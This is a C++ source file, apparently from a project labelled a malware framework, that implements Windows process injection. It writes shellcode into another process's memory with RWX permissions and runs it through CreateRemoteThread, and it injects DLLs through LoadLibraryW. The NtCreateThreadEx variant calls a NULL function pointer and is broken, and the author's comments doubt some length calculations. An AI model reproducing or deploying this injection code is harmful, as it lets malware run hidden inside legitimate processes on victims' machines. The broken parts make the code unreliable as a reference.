#include <Windows.h>
#include <tlHelp32.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include "Process.h"
#include "Utilities.h"

bool Process::InjectDLL(DLL dll) {
	return InjectDll_CreateRemoteThread(dll);
}

bool Process::InjectDLL(DLL payload, int injectionType) {
	switch (injectionType) {
		case INJECT_CREATEREMOTETHREAD:
			return InjectDll_CreateRemoteThread(payload);
		case INJECT_NTCREATETHREAD:
			return InjectDll_NtCreateThreadEx(payload); // This method doesn't work right now
		default:
			std::cout << "Invalid injection method\n";
			return false;
	}
}

bool Process::InjectShellcode(Shellcode shellcode) {

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	std::cout << "Injecting shellcode into process\n";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, shellcode.length(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!remoteBuffer)
		return false;

	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode.get_char(), shellcode.length(), NULL))
		return false;
	if (!CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL))
		return false;
	CloseHandle(processHandle);

	return true;
}

typedef DWORD(WINAPI* prototype_NtCreateThreadEx)(
	PHANDLE                 ThreadHandle,
	ACCESS_MASK             DesiredAccess,
	LPVOID                  ObjectAttributes,
	HANDLE                  ProcessHandle,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID                  lpParameter,
	BOOL                    CreateSuspended,
	DWORD                   dwStackSize,
	DWORD                   Unknown1,
	DWORD                   Unknown2,
	LPVOID                  Unknown3
	);

typedef DWORD(WINAPI* prototype_RtlCreateUserThread)(
	HANDLE      ProcessHandle,
	PSECURITY_DESCRIPTOR  SecurityDescriptor,
	BOOL      CreateSuspended,
	ULONG     StackZeroBits,
	PULONG     StackReserved,
	PULONG     StackCommit,
	LPVOID     StartAddress,
	LPVOID     StartParameter,
	HANDLE      ThreadHandle,
	LPVOID     ClientID
	);
// Create definitions for injection methods like Injection_Method_CreateRemoteThread

bool Process::InjectDll_CreateRemoteThread(DLL dll) {

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	
	std::wstring stemp = Utilities::string_to_wstring(dll.path).c_str();
	LPCWSTR dllPath = stemp.c_str();

	std::cout << "Using dll path " << dllPath << "\n";

	if (hProcess == NULL) {
		std::cout << "Failed to open process\n";
		return false;
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL) {
		std::cout << "Failed to get handle to kernel32.dll\n";
		return false;
	}

	LPVOID llBaseAddress = (LPVOID) GetProcAddress(hKernel32, "LoadLibraryW");
	if (llBaseAddress == NULL) {
		std::cout << "Failed to get LoadLibraryW base address\n";
		return false;
	}

	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpBaseAddress == NULL) {
		std::cout << "Failed to allocate in target process memory\n";
		return false;
	}

	SIZE_T* lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, dllPath, lstrlen(dllPath)*2-1, lpNumberOfBytesWritten); // Is lstrlen correct???
	if (!resWPM) {
		std::cout << "Failed to write process memory\n";
		return false;
	}

	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)llBaseAddress, lpBaseAddress, 0, (LPDWORD)(&ThreadId));
	if (hThread == NULL) {
		std::cout << "Failed to create remote thread\n";
		return false;
	}
	// Implement other two methods

	return true;
}

bool Process::InjectDll_NtCreateThreadEx(DLL dll) {

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	LPCWSTR dllPath = L"C:\\Users\\chase\\Desktop\\malware-framework\\src\\core\\x64\\Debug\\MSGDLL.dll";

	std::cout << "Using dll path " << dllPath << "\n";

	if (hProcess == NULL) {
		std::cout << "Failed to open process\n";
		return false;
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL) {
		std::cout << "Failed to get handle to kernel32.dll\n";
		return false;
	}

	LPVOID llBaseAddress = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
	if (llBaseAddress == NULL) {
		std::cout << "Failed to get LoadLibraryW base address\n";
		return false;
	}

	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpBaseAddress == NULL) {
		std::cout << "Failed to allocate in target process memory\n";
		return false;
	}

	SIZE_T* lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, dllPath, lstrlen(dllPath) * 2 - 1, lpNumberOfBytesWritten); // Is lstrlen correct???
	if (!resWPM) {
		std::cout << "Failed to write process memory\n";
		return false;
	}

	HANDLE hThread = NULL;
	DWORD ThreadId = 0;

	prototype_NtCreateThreadEx pfnNtCreateThreadEx = NULL;
	PVOID pvEncodedPtr = NULL;
	//GetFunctionAddressFromDll("ntdll.dll", "NtCreateThreadEx", (PVOID*)&pfnNtCreateThreadEx);

	pfnNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)llBaseAddress, lpBaseAddress, FALSE, NULL, NULL, NULL, NULL);
	if (hThread == NULL) {
		std::cout << "Failed to NtCreateRemoteThreadEx";
	}

	if (hThread == NULL) {
		std::cout << "Failed to create remote thread\n";
		return false;
	}
	// Implement other two methods

	return true;
}
